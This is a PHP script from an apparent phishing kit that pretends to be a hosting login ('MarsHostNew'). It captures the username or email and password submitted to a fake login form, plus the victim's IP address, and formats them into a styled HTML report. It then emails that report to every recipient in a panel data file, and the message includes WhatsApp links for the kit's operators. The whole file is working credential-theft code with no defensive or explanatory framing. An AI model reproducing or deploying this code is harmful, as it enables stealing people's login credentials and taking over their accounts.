<?php
// Copyright © Ditznesia
// MENANGKAP DATA YG DI INPUT
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

// KONTEN RESULT AKUN
$subjek = "MarsHostNew | HOSTING { $user }";
$pesan = '
<center>
 <div style="background: url(https://i.ibb.co/JFXMWF9/Proyek-Baru-87-8268-E48.png) no-repeat;border:2px solid pink;background-size: 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#821282" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#821282;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>𝗘𝗠𝗔𝗜𝗟/𝗧𝗘𝗟𝗣𝗢𝗡</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #821282; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="http://wa.me/6281933225481">ᴡʜᴀᴛsᴀᴘᴘ 1</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6285770919470">ᴡʜᴀᴛsᴀᴘᴘ 2</a>
</div>
 <center>
';
include 'panel/data.php';
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";


$read = file_get_contents('panel/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>
